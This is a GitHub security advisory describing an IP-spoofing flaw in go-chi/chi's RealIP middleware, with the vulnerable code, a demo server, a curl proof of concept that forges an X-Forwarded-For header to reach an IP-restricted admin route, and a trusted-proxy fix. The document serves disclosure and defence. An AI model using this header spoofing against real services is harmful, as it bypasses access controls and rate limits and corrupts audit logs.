# [H] chi's RealIP Middleware allows IP spoofing via unvalidated X-Forwarded-For header

## Summary
Severity: High
Advisory: GHSA-rjr7-jggh-pgcp
CWE: CWE-290, CWE-348
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-06-25
Source: https://github.com/advisories/GHSA-rjr7-jggh-pgcp
Type: github-advisory

## Affected
- Go: `github.com/go-chi/chi/middleware` — affected >=0
- Go: `github.com/go-chi/chi/v2/middleware` — affected >=0
- Go: `github.com/go-chi/chi/v3/middleware` — affected >=0
- Go: `github.com/go-chi/chi/v4/middleware` — affected >=0
- Go: `github.com/go-chi/chi/v5/middleware` — affected >=0 <5.3.0

## Details
### Summary
realip middleware in go-chi/chi trusts headers like x-forwarded-for without checking them, so attackers can fake their ip and bypass rate limits or access controls

### Details

the vuln is in middleware/realip.go , the realIP() function pulls IPs straight from client headers and replaces r.RemoteAddr without checking if the request came from a trusted proxy

```go
func realIP(r *http.Request) string {
    var ip string
    if tcip := r.Header.Get(trueClientIP); tcip != "" {
        ip = tcip  // controlled by attacker
    } else if xrip := r.Header.Get(xRealIP); xrip != "" {
        ip = xrip  // controlled by attacker
    } else if xff := r.Header.Get(xForwardedFor); xff != "" {
        ip, _, _ = strings.Cut(xff, ",")  // controlled by attacker
    }
    // ...
    return ip
}
```

no trusted proxy cidr check in place, any client can send these headers

### PoC

create a server with chi and use realip middleware

```go
package main

import (
    "fmt"
    "net/http"
    "github.com/go-chi/chi/v5"
    "github.com/go-chi/chi/v5/middleware"
)

func main() {
    r := chi.NewRouter()
    r.Use(middleware.RealIP)

    r.Get("/admin", func(w http.ResponseWriter, r *http.Request) {
        // ip-based access control got bypassed
        if r.RemoteAddr == "127.0.0.1" {
            w.Write([]byte("SECRET ADMIN DATA"))
            return
        }
        http.Error(w, "Forbidden", 403)
    })

    http.ListenAndServe(":8080", r)
}
```

spoofed the ip to bypass access control

```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:8080/admin
```


### Impact

- ip-based access control bypass lets attackers reach restricted endpoints
- rate limiting bypass lets attackers avoid limits by rotating spoofed ips
- audit logs show fake ips picked by attacker instead of real ones
- attackers can get around geo ip restrictions

## Remediation Recommendation

validate proxy cidr first before trusting forwarded ip headers

```go
// add your reverse proxy ip addresses here
var trustedProxies = []net.IPNet{
       {IP: net.ParseIP("10.0.0.0"), Mask: net.CIDRMask(8, 32)},
    {IP: net.ParseIP("172.16.0.0"), Mask: net.CIDRMask(12, 32)},
    {IP: net.ParseIP("192.168.0.0"), Mask: net.CIDRMask(16, 32)},
}

func isTrustedProxy(ip net.IP) bool {
    for _, cidr := range trustedProxies {
        if cidr.Contains(ip) {
            return true
        }
    }
    return false
}
```

## References
- https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp
- https://github.com/go-chi/chi
- https://github.com/go-chi/chi/releases/tag/v5.3.0
